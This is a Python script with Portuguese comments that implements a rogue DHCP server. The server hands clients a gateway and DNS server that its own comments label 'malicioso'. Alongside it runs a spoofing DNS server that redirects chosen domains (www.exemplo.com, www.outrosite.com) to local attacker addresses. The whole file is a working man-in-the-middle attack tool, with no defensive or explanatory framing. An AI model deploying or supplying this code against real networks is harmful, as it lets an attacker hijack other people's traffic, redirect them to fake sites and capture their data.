import socket
import threading

def create_dhcp_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.bind(('0.0.0.0', 67))
    return sock

def receive_dhcp_message(sock):
    while True:
        data, addr = sock.recvfrom(1024)
        dhcp_message_type = data[242]

        if dhcp_message_type == 1:  # DHCP Discover
            print("DHCP Discover recebido de", addr)
            handle_dhcp_discover(sock, data, addr)
        elif dhcp_message_type == 3:  # DHCP Request
            print("DHCP Request recebido de", addr)
            handle_dhcp_request(sock, data, addr)

def handle_dhcp_discover(sock, data, addr):
    transaction_id = data[4:8]
    client_mac = data[28:34]
    print(f"DHCP Discover - Transaction ID: {transaction_id.hex()}, Client MAC: {client_mac.hex()}")
    send_dhcp_offer(sock, transaction_id, client_mac, addr)

def handle_dhcp_request(sock, data, addr):
    transaction_id = data[4:8]
    client_mac = data[28:34]
    requested_ip = data[50:54]
    print(f"DHCP Request - Transaction ID: {transaction_id.hex()}, Client MAC: {client_mac.hex()}, Requested IP: {socket.inet_ntoa(requested_ip)}")
    send_dhcp_ack(sock, transaction_id, client_mac, requested_ip, addr)

def send_dhcp_offer(sock, transaction_id, client_mac, addr):
    offer_packet = build_dhcp_offer(transaction_id, client_mac)
    sock.sendto(offer_packet, ('<broadcast>', 68))
    print("DHCP Offer enviado para", addr)

def send_dhcp_ack(sock, transaction_id, client_mac, requested_ip, addr):
    ack_packet = build_dhcp_ack(transaction_id, client_mac, requested_ip)
    sock.sendto(ack_packet, ('<broadcast>', 68))
    print("DHCP Ack enviado para", addr)

def build_dhcp_offer(transaction_id, client_mac):
    offer_packet = b''
    # Cabeçalho DHCP
    offer_packet += b'\x02'  # Op (2 = Boot Reply)
    offer_packet += b'\x01'  # Htype
    offer_packet += b'\x06'  # Hlen
    offer_packet += b'\x00'  # Hops
    offer_packet += transaction_id  # Xid
    offer_packet += b'\x00\x00'  # Secs
    offer_packet += b'\x00\x00'  # Flags
    offer_packet += b'\x00\x00\x00\x00'  # Ciaddr
    offer_packet += socket.inet_aton('192.168.1.100')  # Yiaddr (IP oferecido)
    offer_packet += b'\x00\x00\x00\x00'  # Siaddr
    offer_packet += b'\x00\x00\x00\x00'  # Giaddr
    offer_packet += client_mac  # Chaddr
    offer_packet += b'\x00' * 10  # Chaddr padding
    offer_packet += b'\x00' * 192  # Bootp legacy padding
    offer_packet += b'\x63\x82\x53\x63'  # Magic cookie
    offer_packet += b'\x35\x01\x02'  # DHCP Message Type (Offer)
    offer_packet += b'\x36\x04' + socket.inet_aton('192.168.1.1')  # DHCP Server Identifier
    offer_packet += b'\x01\x04\xff\xff\xff\x00'  # Subnet Mask
    offer_packet += b'\x03\x04' + socket.inet_aton('192.168.1.1')  # Router (gateway malicioso)
    offer_packet += b'\x06\x04' + socket.inet_aton('192.168.1.1')  # DNS Server (DNS malicioso)
    offer_packet += b'\xff'  # End Option

    return offer_packet

def build_dhcp_ack(transaction_id, client_mac, requested_ip):
    ack_packet = b''
    # Cabeçalho DHCP
    ack_packet += b'\x02'  # Op (2 = Boot Reply)
    ack_packet += b'\x01'  # Htype
    ack_packet += b'\x06'  # Hlen
    ack_packet += b'\x00'  # Hops
    ack_packet += transaction_id  # Xid
    ack_packet += b'\x00\x00'  # Secs
    ack_packet += b'\x00\x00'  # Flags
    ack_packet += b'\x00\x00\x00\x00'  # Ciaddr
    ack_packet += requested_ip  # Yiaddr (IP oferecido)
    ack_packet += b'\x00\x00\x00\x00'  # Siaddr
    ack_packet += b'\x00\x00\x00\x00'  # Giaddr
    ack_packet += client_mac  # Chaddr
    ack_packet += b'\x00' * 10  # Chaddr padding
    ack_packet += b'\x00' * 192  # Bootp legacy padding
    ack_packet += b'\x63\x82\x53\x63'  # Magic cookie
    ack_packet += b'\x35\x01\x05'  # DHCP Message Type (Ack)
    ack_packet += b'\x36\x04' + socket.inet_aton('192.168.1.1')  # DHCP Server Identifier
    ack_packet += b'\x01\x04\xff\xff\xff\x00'  # Subnet Mask
    ack_packet += b'\x03\x04' + socket.inet_aton('192.168.1.1')  # Router (gateway malicioso)
    ack_packet += b'\x06\x04' + socket.inet_aton('192.168.1.1')  # DNS Server (DNS malicioso)
    ack_packet += b'\xff'  # End Option

    return ack_packet

# Servidor DNS malicioso
def start_dns_server():
    dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Adicionar esta linha
    dns_socket.bind(('0.0.0.0', 53))
    dns_mapping = {
        b'www.exemplo.com': '192.168.1.101',
        b'www.outrosite.com': '192.168.1.102'
    }
    print("Servidor DNS malicioso iniciado e escutando na porta 53.")
    while True:
        query, addr = dns_socket.recvfrom(512)
        print(f"Consulta DNS recebida de {addr}")
        print(f"Conteúdo da consulta DNS: {query}")
        domain = extract_domain_from_query(query)
        print(f"Dominio extraído: {domain}")
        if domain in dns_mapping:
            response = build_dns_response(query, dns_mapping[domain])
            dns_socket.sendto(response, addr)
            print(f"Consulta DNS para {domain.decode()} respondida com {dns_mapping[domain]}")
        else:
            print(f"Consulta DNS para {domain.decode()} não encontrada no mapeamento.")

def extract_domain_from_query(query):
    domain = b''
    i = 12
    while query[i] != 0:
        length = query[i]
        domain += query[i+1:i+1+length] + b'.'
        i += length + 1
    return domain[:-1]

import socket

def build_dns_response(query, ip):
    transaction_id = query[:2]
    flags = b'\x81\x80'  # Resposta com flag padrão (sem erro)
    questions = query[4:6]
    answer_rrs = b'\x00\x01'  # Número de respostas
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    
    # Cabeçalho da resposta
    response = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
    
    # Adicionando a pergunta original
    query_name_end = query.find(b'\x00', 12) + 1
    response += query[12:query_name_end]
    
    # Adicionando o tipo e a classe da pergunta original
    response += query[query_name_end:query_name_end+4]
    
    # Adicionando a resposta
    response += b'\xc0\x0c'  # Ponteiro para o nome do domínio na consulta original
    response += b'\x00\x01'  # Tipo (A)
    response += b'\x00\x01'  # Classe (IN)
    response += b'\x00\x00\x00\x3c'  # TTL (60 segundos)
    response += b'\x00\x04'  # Comprimento dos dados
    response += socket.inet_aton(ip)  # Endereço IP
    
    # Log para depuração
    print(f"Construindo resposta DNS: transaction_id={transaction_id}, flags={flags}, questions={questions}, "
          f"answer_rrs={answer_rrs}, authority_rrs={authority_rrs}, additional_rrs={additional_rrs}, "
          f"response={response}")

    return response


def main():
    threading.Thread(target=dhcp_server_main).start()
    threading.Thread(target=start_dns_server).start()

def dhcp_server_main():
    dhcp_socket = create_dhcp_socket()
    receive_dhcp_message(dhcp_socket)

if __name__ == "__main__":
    main()
